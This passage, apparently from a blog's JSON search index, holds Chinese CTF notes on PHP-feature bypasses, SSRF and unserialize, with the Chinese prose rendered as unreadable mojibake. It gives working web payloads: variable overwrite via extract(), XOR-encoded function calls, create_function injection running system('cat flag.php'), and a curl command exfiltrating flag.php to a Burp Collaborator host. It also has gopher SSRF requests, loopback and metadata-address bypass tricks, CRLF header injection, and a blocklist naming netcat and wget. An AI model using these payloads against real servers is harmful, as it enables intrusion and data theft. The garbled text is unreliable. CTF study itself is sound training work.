å°±å¯ä»¥ç»•è¿‡å¯¹isset($fl0g)çš„åˆ¤æ–­ã€‚ç”¨+ä»£è¡¨ç©ºæ ¼\næœ€ç»ˆpayload\n\nä¸‹å›¾å¯ä»¥çœ‹åˆ°\n$_SERVER[argv][0]ç­‰åŒäº$_SERVER[QUARY_STRING]\né€šè¿‡æœ¬åœ°å®éªŒå¯å¾— urlç›´æ¥è¾“å…¥å­—ç¬¦å°±æ˜¯$_SERVER[&#39;argv&#39;][0] æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ¥æ‰§è¡Œphpè¯­å¥ã€‚\n\næœ€ç»ˆpayload \n\n22.extractæ„é€ æ–°å˜é‡web127\nå½“çœ‹è§\nextract($_GET)æ—¶\nå³å¯ç›´æ¥æ„é€ å¹¶å¼•å…¥æ–°å˜é‡\n1234if($ctf_show===&#x27;ilove36d&#x27;)&#123;echo $flag;&#125;\n\nå°±ç›´æ¥å¯ä»¥ä¼ å…¥\nGET:url?ctf_show&#x3D;ilove36d\nå³ä½¿å…ˆå‰å·²å­˜åœ¨$ctf_showä¹Ÿä¼šè¦†ç›–æ‰\næœ€ç»ˆpayloadï¼š\nGET:url?ctf show&#x3D;ilove36d  ä¸‹åˆ’çº¿ç”¨ç©ºæ ¼æˆ–+æ›¿ä»£å³å¯\n23._()  åˆ«ågettext() å‡½æ•°\nå¯¹f1è¿›è¡Œæ— å­—æ¯æ•°å­—è¿‡æ»¤\næ‰€ä»¥var_dump var_exportéƒ½ç”¨ä¸äº†\nå¯ä»¥æƒ³åˆ°gettext() å¯ä»¥å°†å‚æ•°ç¿»è¯‘æˆæŒ‡å®šè¯­è¨€ï¼Œä¸€èˆ¬å°±æ˜¯åŸå°ä¸åŠ¨çš„è¾“å‡ºå‚æ•°\nåˆ«å_()å¯ä»¥ä¼ å…¥\næœ€ç»ˆpayload:\n?f1&#x3D;_&amp;f2&#x3D;get_defined_vars    call_user_funcä¼ å…¥å‚æ•°æ—¶ä»…éœ€ä¼ å…¥å‚æ•°åç§°å³å¯\n24.striposå‡½æ•°ç»•è¿‡web130æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰\nè¿”å›å¸ƒå°”å€¼ï¼Œæœªæ‰¾åˆ°è¿”å›0ï¼ˆfalseï¼‰,æ‰¾åˆ°è¿”å›1ï¼ˆtrueï¼‰\né‡‡ç”¨æ•°ç»„ç»•è¿‡çš„æ–¹æ³•ï¼Œstriposå‡½æ•°ä¼šè¿”å›null,null!=false,æ‰€ä»¥å¯ä»¥ç»•è¿‡striposå‡½æ•°\n25.substræˆªå–ç»•è¿‡&amp;æ•°æ®å¤–å¸¦123456789if($F = @$_GET[&#x27;F&#x27;])&#123;    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))    &#123;        eval(substr($F,0,6));    &#125;else    &#123;        die(&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;);    &#125;&#125;\n\nGETä¼ å…¥\n1.ä¼ å…¥çš„æ˜¯$Fæœ¬èº«\n2.è¿”å›çš„æ˜¯6ä¸ªå­—ç¬¦ æœ‰ä¸€ä¸ªç©ºæ ¼\n3.æ‰€ä»¥è¿”å›åevalä¸­æœ¬è´¨æ˜¯eval()\n4.å› ä¸º$F &#x3D; @$_GET[&#39;F&#39;]ï¼Œ$_GET[&#39;F&#39;]å†…å®¹ä¸º\n5.å³eval() \n6.å‘ç°æ‰§è¡Œåç½‘é¡µåŠ è½½ä¸‰ç§’ï¼Œå³å¯æ„é€ å‘½ä»¤æ‰§è¡Œ\n7.å‘ç°touch 1ï¼›å‘½ä»¤æ— æ•ˆï¼Œè½¬ä¸ºæ•°æ®å¤–å¸¦\nåˆ©ç”¨burpçš„Collaborator Client ç±»ä¼¼dnslog ä½†æ›´å¼ºå¤§\npayloadï¼š\n\ncurl -X POST -F xx&#x3D;@flag.php\n-X POST æŒ‡å®šäº†è¯·æ±‚çš„æ–¹æ³•ä¸º POST\n-F xx=@flag.php åˆ™è¡¨ç¤ºå‘è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ªåä¸º xx çš„è¡¨å•å­—æ®µï¼Œå¹¶å°†æ–‡ä»¶ flag.php çš„å†…å®¹ä½œä¸ºè¯¥å­—æ®µçš„å€¼\nè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯å°† flag.php æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªè¡¨å•å­—æ®µå‘é€åˆ°æŒ‡å®šçš„ç›®æ ‡åœ°å€\nç›®æ ‡åœ°å€å³æ˜¯burpçš„Collaborator Clientä¸­è·å–åˆ°åŸŸå\nè·å–åæ‰§è¡Œä¼šå¾—åˆ°å›æ˜¾\nå³æ•°æ®å¤–å¸¦æˆåŠŸ\n\n26.$_SERVER[QUARY_STRING]å’Œparse_strçš„å¦™ç”¨12345&lt;?php highlight_file(__FILE__);$F = @$_POST[&#x27;F&#x27;];$b=&#x27;aaaaaaa&#x27;;eval($F);@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);\n\n\næŸ¥çœ‹å‘ç°GETä¼ å‚ä¸­aå·²è¢«parse_strå‡½æ•°è§£ææˆå˜é‡\n\nweb134\næˆ‘ä»¬å°±å¯ä»¥åœ¨GETä¼ \n?_POST[key1]=36d&amp;_POST[key2]=36d\n1.ç»•è¿‡ç¬¬ä¸€ä¸ªif\n2.å°†_POST[key1]è§£ææˆ$_POST[]\n3.ç¬¦åˆç¬¬äºŒä¸ªifåˆ¤æ–­\n27.ls &gt; 112 å’Œ ls |tee 114å‘½ä»¤æ‰§è¡Œå›æ˜¾è¾“å…¥åˆ°æ–‡ä»¶\n1.2.\nweb136ç¬¬ä¸€ç§æ–¹æ³•è¢«banæ‰\npayload:\nGET:  ?c&#x3D;cat &#x2F;f149_15_h3r3 | tee 1\nè®¿é—®url&#x2F;1ä¹‹åä¼šä¸‹è½½æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å³æ˜¯å›æ˜¾\n\n28.é€šè¿‡call_user_func()è°ƒç”¨ç±»ä¸­æ–¹æ³•web1371234567891011&lt;?phpclass ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]); \n\npayload:\n1.POST:ctfshow&#x3D;ctfshow::getFlag  ç­‰åŒäº  call_user_func(ctfshow .â€™::getFlagâ€™);\n2.POST:**ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag **ç­‰åŒäº call_user_func(array(ctfshow, â€˜getFlagâ€™));\n29.å¼±ç±»å‹æ¯”è¾ƒweb140åœ¨PHPä¸­ï¼Œå½“è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒæ—¶ï¼Œå¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²è¢«è½¬æ¢æˆæ•´æ•°æ—¶ï¼Œä¼šæ ¹æ®å…¶å†…å®¹è¿›è¡Œè½¬æ¢ã€‚å¦‚æœå­—ç¬¦ä¸²ä¸èƒ½è¢«è½¬æ¢ä¸ºåˆæ³•çš„æ•´æ•°ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è½¬æ¢ä¸º0ã€‚\neg:    if(intval($code) == &#39;ctfshow&#39;)\nå‰è€…è¿”å›å€¼ä¸º0å³å¯é€šè¿‡åˆ¤æ–­\n12345678f1=sleep&amp;f2=sleepf1=md5&amp;f2=phpinfof1=md5&amp;f2=md5f1=sha1&amp;f2=getcwdf1=intval&amp;f2=getcwdf1=getcwd&amp;f2=getcwdf1=exec&amp;f2=execf1=system&amp;f2=system\n\næ€»ä¹‹æ€è·¯å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°, ä½¿å®ƒçš„è¿”å›å€¼ä¸ºç©º, ç©ºå€¼ intval ä¹‹åä¹Ÿä¼šå˜æˆ0\n30.æ•°å­—å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—eg:\n&lt;?phpecho 1-(&#39;phpinfo&#39;)()-1; \nweb141åŠ å‡è¿ç®—\n1preg_match(&#x27;/^\\W+$/&#x27;, $str)\n\n\n^ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å¤´\n\\Wï¼šåŒ¹é…ä»»ä½•éå•è¯å­—ç¬¦ï¼ˆ[^a-zA-Z0-9_]ï¼‰\n+ï¼šåŒ¹é…å‰é¢çš„æ¨¡å¼ä¸€æ¬¡æˆ–å¤šæ¬¡\n$ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾\n\n\npayload:v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-(â€œ%08%02%08%08%05%0dâ€^â€%7b%7b%7b%7c%60%60â€)(â€œ%03%01%08%00%06%0c%01%07%00%0b%08%0bâ€^â€%60%60%7c%20%60%60%60%60%2e%7b%60%7bâ€);\nweb145ä¸‰ç›®è¿ç®—   a|b|c\npayload:\nv1&#x3D;1&amp;v3&#x3D;|(%8C%86%8C%8B%9A%92)(%9C%9E%8B%DF%99%D5)|&amp;v2&#x3D;1\nv1&#x3D;1&amp;v3&#x3D;?(%8C%86%8C%8B%9A%92)(%9C%9E%8B%DF%99%D5):&amp;v2&#x3D;1\n31.phpå‘½åç©ºé—´  &amp;  create_functionå‡½æ•°æ³¨å…¥å‘½åç©ºé—´ä½¿ç”¨PHP å‘½åç©ºé—´ä¸­çš„ç±»åå¯ä»¥é€šè¿‡ä¸‰ç§æ–¹å¼å¼•ç”¨ï¼š\n\néé™å®šåç§°ï¼Œæˆ–ä¸åŒ…å«å‰ç¼€çš„ç±»åç§°ï¼Œä¾‹å¦‚ $a&#x3D;new foo(); æˆ–  foo::staticmethod();ã€‚å¦‚æœå½“å‰å‘½åç©ºé—´æ˜¯ currentnamespaceï¼Œfoo å°†è¢«è§£æä¸º  currentnamespace\\fooã€‚å¦‚æœä½¿ç”¨ foo çš„ä»£ç æ˜¯å…¨å±€çš„ï¼Œä¸åŒ…å«åœ¨ä»»ä½•å‘½åç©ºé—´ä¸­çš„ä»£ç ï¼Œåˆ™ foo ä¼šè¢«è§£æä¸ºfooã€‚  è­¦å‘Šï¼šå¦‚æœå‘½åç©ºé—´ä¸­çš„å‡½æ•°æˆ–å¸¸é‡æœªå®šä¹‰ï¼Œåˆ™è¯¥éé™å®šçš„å‡½æ•°åç§°æˆ–å¸¸é‡åç§°ä¼šè¢«è§£æä¸ºå…¨å±€å‡½æ•°åç§°æˆ–å¸¸é‡åç§°ã€‚\n\né™å®šåç§°,æˆ–åŒ…å«å‰ç¼€çš„åç§°ï¼Œä¾‹å¦‚ $a &#x3D; new  subnamespace\\foo(); æˆ– subnamespace\\foo::staticmethod();ã€‚å¦‚æœå½“å‰çš„å‘½åç©ºé—´æ˜¯  currentnamespaceï¼Œåˆ™ foo ä¼šè¢«è§£æä¸º currentnamespace\\subnamespace\\fooã€‚å¦‚æœä½¿ç”¨ foo  çš„ä»£ç æ˜¯å…¨å±€çš„ï¼Œä¸åŒ…å«åœ¨ä»»ä½•å‘½åç©ºé—´ä¸­çš„ä»£ç ï¼Œfoo ä¼šè¢«è§£æä¸ºsubnamespace\\fooã€‚\n\nå®Œå…¨é™å®šåç§°ï¼Œæˆ–åŒ…å«äº†å…¨å±€å‰ç¼€æ“ä½œç¬¦çš„åç§°ï¼Œä¾‹å¦‚ï¼Œ $a &#x3D; new  \\currentnamespace\\foo(); æˆ–  \\currentnamespace\\foo::staticmethod();ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œfoo æ€»æ˜¯è¢«è§£æä¸ºä»£ç ä¸­çš„æ–‡å­—å(literal  name)currentnamespace\\fooã€‚\n\n\næˆ‘ä»¬å¸¸ä½¿ç”¨çš„æ˜¯ç¬¬ä¸‰ä¸ª å®Œå…¨é™å®šåç§°\nâ€‹\tè”ç³»ä¸Šæ–‡ï¼Œå¦‚æœæˆ‘ä»¬è¦è°ƒç”¨phpä¸­çš„å‡½æ•°ï¼Œå°±å¯ä»¥\nâ€‹\t\\create_function ï¼ˆè¾“å…¥å‡½æ•°åå³å¯ï¼‰\nâ€‹\tè¿™æ ·å†™å‘æ˜¯å› ä¸º \\ åçš„å˜é‡æ˜¯è°ƒç”¨  \\  è¿™ä¸ªå‘½åç©ºé—´ä¸‹çš„\nâ€‹\tåŒç†ï¼Œè°ƒç”¨\\è¿™ä¸ªå‘½åç©ºé—´ä¸‹çš„å‡½æ•°ï¼Œå³\\create_function\ncreate_functionå‡½æ•°æ³¨å…¥create_function  åŒ¿åå‡½æ•°åŠ¨æ€åˆ›å»ºå‡½æ•°\neg:\n12345&lt;?php$id = $_GET[&#x27;id&#x27;];$q = &#x27;echo&#x27;.$id.&#x27;is&#x27;.$a.&quot;;&quot;;$sy = create_function(&#x27;$a&#x27;,$q);?&gt;\n\nè¿™æ®µä»£ç ç­‰ä»·äº\n123function niming($a)&#123;       echo $id.&#x27;is&#x27;.$a;&#125;\n\nå‰è€…ä¸­çš„qå°±ç›¸å½“äºå‡½æ•°ä½“\næˆ‘ä»¬ç¬¬äºŒæ®µä»£ç æœ¬åœ°å®éªŒå‘ç°å¯ä»¥é—­åˆå‡½æ•°ä½“ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ ï¼ˆcreate_functionå‡½æ•°æ˜¯è°ƒç”¨äº†evalï¼‰\n1234http://localhost/create_function.php?id=1;&#125;phpinfo();/*;&#125; é—­åˆåŸæ¥å‡½æ•°ä½“/*  é—­åˆåä¼šå¤šå‡ºæ¥ä¸€ä¸ª / ï¼Œéœ€å°†å…¶æ³¨é‡Šæ‰\n\n\nå‘ç°phpæ¢é’ˆæˆåŠŸ\nç”¨ç¬¬ä¸€æ®µä»£ç è¿›è¡Œæœ¬åœ°å®éªŒå‘ç°ä¹Ÿå¯æ‰§è¡Œ\nweb147payload:\nPOST: ctf&#x3D;\\create_function\nGET: ?show&#x3D;1;}system(â€˜cat flag.phpâ€™);&#x2F;*\n","slug":"phpç‰¹æ€§","date":"2024-10-25T06:19:58.000Z","categories_index":"","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"41141451a0f1e1bb096d2164075e94d3","title":"SSRF","content":"SSRF\n\nSSRFä¿¡æ¯æ”¶é›†ssrfä¿¡æ¯æ”¶é›†Fileä¼ªåè®® æ‰«æå†…ç½‘ä¸»æœºæŸ¥çœ‹å†…ç½‘åœ°å€ file:&#x2F;&#x2F;&#x2F;etc&#x2F;host\nå¯»æ‰¾å†…ç½‘å…¶ä»–ä¸»æœº file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arpArpåè®®å¯æ— è§†é˜²ç«å¢™ åªè¦åœ¨å·¥ä½œå³å¯æ‰«å‡ºæ¥\né…åˆBPæ‰«æè¯¥ç½‘æ®µ\n\nssrfä¿¡æ¯æ”¶é›†Ditcä¼ªåè®® æ‰«æå†…ç½‘ä¸»æœºç«¯å£è¿ç”¨BPé›†æŸç‚¸å¼¹æ¨¡å¼æ‰«æç½‘æ®µå’Œç«¯å£â€‹    æ“ä½œåŒç†\n\nDitcä¼ªåè®® æ‰«æé€Ÿåº¦å¿«ç«¯å£æ‰«æå¸¸ç”¨ç«¯å£\n\nssrfä¿¡æ¯æ”¶é›†HTTPä¼ªåè®® æ‰«æå­åŸŸé…åˆBPå¯¼å…¥å­—å…¸æ‰«æ\n\nSSRF Gopherä¼ªåè®®â€‹    \nGETä¼ å‚pocâ€‹    \nè¿›è¡Œurlç¼–ç \n[gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;**_**GET%20&#x2F;name.php%3fname&#x3D;benben%20HTTP&#x2F;1.1%0d%0AHost:%20172.250.250.4%0d%0A](gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_GET &#x2F;name.php%3fname&#x3D;benben HTTP&#x2F;1.1 Host: 172.250.250.4 )  \nGETæäº¤æœ€åä¸€å®šè¦å¢åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ %0d%0a\nâ€‹    ã€\nä¹Ÿå¯ä»¥ä¼ ä¸€ä¸ª gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_ å†å°†pocç²˜è´´åœ¨åè¾¹ï¼ˆè®°å¾—è¦2æ¬¡URLç¼–ç å¯æ­é…BPæˆ–Hackbarï¼‰æ¼”ç¤ºæ–¹æ³•å¦‚ä¸‹\nPOSTä¼ å‚poc\nContent-length è¦å’Œæäº¤é•¿åº¦ç›¸å¯¹åº” å¦‚ä¸Š name&#x3D;jianjian æœ‰åä¸‰ä¸ªå­—ç¬¦ leangthä¸º13 \nå°†pocæ”¾å…¥æ‹¦æˆªç½‘ç«™ä¸‹åˆ’çº¿å\n\né€‰ä¸­çš„éƒ¨åˆ†è¿›è¡Œä¸¤æ¬¡URLç¼–ç \n\nç¼–ç åå¦‚å›¾\n\næ”¾è¡Œå³å¯\n\n\nSSRFä¹‹å›ç¯åœ°å€ç»•è¿‡\nâ€‹    å¯è§ 127.0.0.1è¢«ç¦æ­¢\nå¯ä»¥å°†ç‚¹åˆ†åè¿›åˆ¶è½¬æ¢æˆåè¿›åˆ¶â€‹    2130706433 å³å¯ç»•è¿‡\nâ€‹    \nâ€‹    å…¶ä»–è¿›åˆ¶åŒç†\nâ€‹    \nSSRFä¹‹302é‡å®šå‘ç»•è¿‡\nå…ˆæ­å»ºä¸€ä¸ªå…¬ç½‘æœåŠ¡ ï¼ˆç”¨phpæ­å»ºï¼‰\nä»£ç å¦‚ä¸‹\n\nå®ç°ä¸€ä¸ª302é‡å®šå‘åˆ°127.0.0.1çš„åŠŸèƒ½\nå¼€å¯ç½‘ç«™æœåŠ¡\n\nå†å°†ç›‘å¬çš„ipæ˜ å°„åˆ°å…¬ç½‘æœåŠ¡å™¨ä¸Š\nè®¿é—®å…¬ç½‘ipä¹‹åå³å¯é‡å®šå‘å¹¶è¿”å›åˆ°å¯¹æ–¹æœåŠ¡å™¨ä¸‹çš„flag.phpçš„å†…å®¹\n\nSSRFä¹‹DNSé‡ç»‘å®šç»•è¿‡â€‹    DNSé‡ç»‘å®šç½‘ç«™ http://lock.cmpxchg8b.com/rebinder.html\nâ€‹     \nâ€‹    \nSSRFä¹‹å‘½ä»¤æ‰§è¡Œâ€‹    å¯ä»¥ç›´æ¥ä¼ cmdå‘½ä»¤\nâ€‹    \nâ€‹    ä¹Ÿå¯ä»¥æ­é…gopheråè®®ä½¿ç”¨ æ¥ä¼ POSTå‚æ•°\nSSRFä¹‹XXEæ¼æ´åˆ©ç”¨â€‹    é€šè¿‡å¿«ç…§å¯çŸ¥ä¸ºpostä¼ å‚\n \nâ€‹    é€šè¿‡æºä»£ç å¯çŸ¥content-typeä¸ºxml ä»è€Œå¯ä»¥åˆ©ç”¨xxeæ¼æ´\nâ€‹    \nâ€‹    Pocæ„é€ å¦‚ä¸‹\nâ€‹    \nâ€‹    æœ€åå†åˆ©ç”¨gopherä¼ªåè®®æ¥æäº¤POSTå‚æ•°\nSSRFä¹‹SQLæ³¨å…¥GETæ³¨æ„ä¸¤ç‚¹å³å¯\nâ€‹    1\nâ€‹    \n2\n\nPOSTæ³¨å…¥ä»æ˜¯åˆ©ç”¨gopharæ„é€ poc\n\nSSRFä¹‹æ–‡ä»¶ä¸Šä¼ â€‹    åˆ©ç”¨gopharæ„é€ poc ï¼ˆæ³¨æ„content-typeå˜åŒ–ï¼‰\n \nPs:boundary&#x3D;xxxxx xxxxxå¯è‡ªå®šä¹‰ åœ¨ä¸Šè¾¹pocä¸­ â€“xxxxxä¸ºåˆ†å‰²ç¬¦ â€“xxxxxâ€“ä¸ºç»“æŸç¬¦\nâ€‹    ä¸Šä¼ å®Œæˆä¹‹åè®¿é—®æ–‡ä»¶ç›®å½•å³å¯\n\nSSRFå†™å…¥æ“ä½œâ€‹    ã€0x016 ä½¿ç”¨SSRFå¯¹mysqlè¿›è¡ŒæœªæˆæƒæŸ¥è¯¢ã€‘https://www.bilibili.com/video/BV1qQ4y1u7S4?vd_source&#x3D;dbbe851caa5969ed57ce1b7f9b095e7c\nâ€‹    16-21\nâ€‹    \nå¸¸è§çš„ç»•è¿‡æ–¹å¼æ€»ç»“1ã€é™åˆ¶ä¸ºhttp://www.xxx.com åŸŸåæ—¶ï¼ˆåˆ©ç”¨@ï¼‰txtå¯ä»¥å°è¯•é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡\nå¦‚ï¼šhttp://www.aaa.com@www.bbb.com@www.ccc.comï¼Œåœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚\nåœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸ºwww.bbb.comã€‚2.é‡‡ç”¨çŸ­ç½‘å€ç»•è¿‡txtæ¯”å¦‚ç™¾åº¦çŸ­åœ°å€https://dwz.cn/3.é‡‡ç”¨è¿›åˆ¶è½¬æ¢txt127.0.0.1å…«è¿›åˆ¶ï¼š0177.0.0.1ã€‚åå…­è¿›åˆ¶ï¼š0x7f.0.0.1ã€‚åè¿›åˆ¶ï¼š2130706433.åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\n4.åˆ©ç”¨ç‰¹æ®ŠåŸŸåtxtåŸç†æ˜¯DNSè§£æã€‚xip.ioå¯ä»¥æŒ‡å‘ä»»æ„åŸŸåï¼Œå³\n127.0.0.1.xip.ioï¼Œå¯è§£æä¸º127.0.0.1\n(xip.io ç°åœ¨å¥½åƒç”¨ä¸äº†äº†ï¼Œå¯ä»¥æ‰¾æ‰¾å…¶ä»–çš„)5.åˆ©ç”¨[::]txtå¯ä»¥åˆ©ç”¨[::]æ¥ç»•è¿‡localhost\nhttp://169.254.169.254&gt;&gt;http://[::169.254.169.254]6.åˆ©ç”¨å¥å·txt127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; 127.0.0.17ã€CRLF ç¼–ç ç»•è¿‡txt%0d-&gt;0x0d-&gt;\\rå›è½¦\n%0a-&gt;0x0a-&gt;\\næ¢è¡Œ\nè¿›è¡ŒHTTPå¤´éƒ¨æ³¨å…¥example.com&#x2F;?url&#x3D;http://eval.com%0d%0aHOST:fuzz.com%0d%0a \ntxt18.åˆ©ç”¨å°é—­çš„å­—æ¯æ•°å­—txtåˆ©ç”¨Enclosed alphanumerics\nâ“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ &gt;&gt;&gt; example.com\nhttp://169.254.169.254&gt;&gt;&gt;http://[::â‘ â‘¥â‘¨ï½¡â‘¡â‘¤â‘£ï½¡â‘¯â‘¨ï½¡â‘¡â‘¤â‘£]\nList:\nâ‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³\nâ‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡\nâ’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’›\nâ’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ\nâ’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“\nâ“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“©\nâ“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´\nâ“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿","slug":"SSRF","date":"2024-10-24T06:13:31.000Z","categories_index":"","tags_index":"ctf","author_index":"Sygsdsg"},{"id":"aead1356d56fb4acb210e498b4d44c7a","title":"Unserialize","content":"Unserializeå‰ç½®çŸ¥è¯†\n  \n   åºåˆ—åŒ–åè¯­å¥ä¸º\n1a:3:&#123;s:4:&quot;name&quot;;s:8:&quot;John Doe&quot;;s:3:&quot;age&quot;;i:25;s:6:&quot;grades&quot;;a:3:&#123;i:0;i:85;i:1;i:90;i:2;i:78;&#125;&#125;\n\n\na:3: è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå…³è”æ•°ç»„ç±»å‹ï¼ˆå³ Arrayï¼‰ã€‚\n{} è¡¨ç¤ºæ•°ç»„å…ƒç´ çš„å¼€å§‹å’Œç»“æŸã€‚\ns:4:â€nameâ€;     è¡¨ç¤ºé”®åä¸º â€œnameâ€ çš„å­—ç¬¦ä¸²ç±»å‹å…ƒç´ ï¼Œé•¿åº¦ä¸º 4ã€‚\ns:8:â€John     Doeâ€; è¡¨ç¤ºé”®åä¸º â€œnameâ€ çš„å­—ç¬¦ä¸²ç±»å‹å€¼ï¼Œé•¿åº¦ä¸º 8ã€‚\ns:3:â€ageâ€;     è¡¨ç¤ºé”®åä¸º â€œageâ€ çš„å­—ç¬¦ä¸²ç±»å‹å…ƒç´ ï¼Œé•¿åº¦ä¸º 3ã€‚\ni:25; è¡¨ç¤ºé”®åä¸º â€œageâ€ çš„æ•´æ•°ç±»å‹å€¼ã€‚\ns:6:â€gradesâ€;     è¡¨ç¤ºé”®åä¸º â€œgradesâ€ çš„å­—ç¬¦ä¸²ç±»å‹å…ƒç´ ï¼Œé•¿åº¦ä¸º 6ã€‚\na:3:{} è¡¨ç¤ºä¸€ä¸ªç´¢å¼•æ•°ç»„ç±»å‹ï¼ˆå³ Arrayï¼‰ï¼ŒåŒ…å«ä¸‰ä¸ªå…ƒç´ ã€‚\ni:0;i:85; è¡¨ç¤ºç¬¬ä¸€ä¸ªå…ƒç´ çš„é”®åä¸º 0ï¼Œå€¼ä¸º 85ã€‚\ni:1;i:90; è¡¨ç¤ºç¬¬äºŒä¸ªå…ƒç´ çš„é”®åä¸º 1ï¼Œå€¼ä¸º 90ã€‚\ni:2;i:78; è¡¨ç¤ºç¬¬ä¸‰ä¸ªå…ƒç´ çš„é”®åä¸º 2ï¼Œå€¼ä¸º 78ã€‚\n\né­”æœ¯å˜é‡__construct()æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡æ—¶è§¦å‘__destruct()ææ„å‡½æ•°å¯¹è±¡é”€æ¯æ—¶unserializeåè§¦å‘\nåŸºç¡€æ¼æ´å®ä¾‹\n__sleepåºåˆ—åŒ–ä¹‹å‰è§¦å‘\n\nsleepä¸ serializeæ†ç»‘ï¼Œæ‰€ä»¥urlä¼ å‚æ—¶ç›´æ¥ä¼ å‘½ä»¤æœ¬ä½“\n__wakeupååºåˆ—åŒ–ä¹‹å‰è§¦å‘ç”¨æ³•ä¸sleepç›¸ä¼¼\nWakeupä¸unserializeæ†ç»‘\næ‰€ä»¥urlä¼ å‚æ—¶ç›´æ¥ä¼ å‘½ä»¤çš„åºåˆ—åŒ–å½¢å¼\nEg:\n\næ‘˜å‡ºwakeupä¸­ç›¸å…³çš„å‚æ•°,å†™phpè¿è¡Œå‡ºç›¸åº”çš„payloadåºåˆ—åŒ–å¼å‘½ä»¤ \n\n\nè¿›è¡Œurlä¼ å‚è·å–ç›®æ ‡\n\nWakeupç»•è¿‡å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶\nä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ\n å¯è§é¢˜è§£ https://www.nssctf.cn/note/set/2934\n__toString()æŠŠå¯¹è±¡å½“åšå­—ç¬¦ä¸²è°ƒç”¨æ—¶è§¦å‘ç›¸å…³å‡½æ•° strtolower()\nEg:\n1234567891011121314151617&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;        public function __toString() &#123;        return &#x27;æ ¼å¼ä¸å¯¹ï¼Œè¾“å‡ºä¸äº†!&#x27;;    &#125;&#125;$test = new User();print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;\n\n12User Object ( [benben] =&gt; this is test!! ) æ ¼å¼ä¸å¯¹ï¼Œè¾“å‡ºä¸äº†!\n\n \næ ‡è®°çš„ä¸¤å¥å‡æŠŠå¯¹è±¡å½“åšå­—ç¬¦ä¸²è°ƒç”¨\n__invoke()æŠŠå¯¹è±¡å½“å‡½æ•°è°ƒç”¨æ—¶è§¦å‘è§¦å‘ç›¸å…³ä»£ç \nreturn $bb();\nç¤ºä¾‹\n123456789101112131415161718&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;    public function __invoke() &#123;        echo &#x27;å®ƒä¸æ˜¯ä¸ªå‡½æ•°!&#x27;;        return $this; // return $this to allow chaining 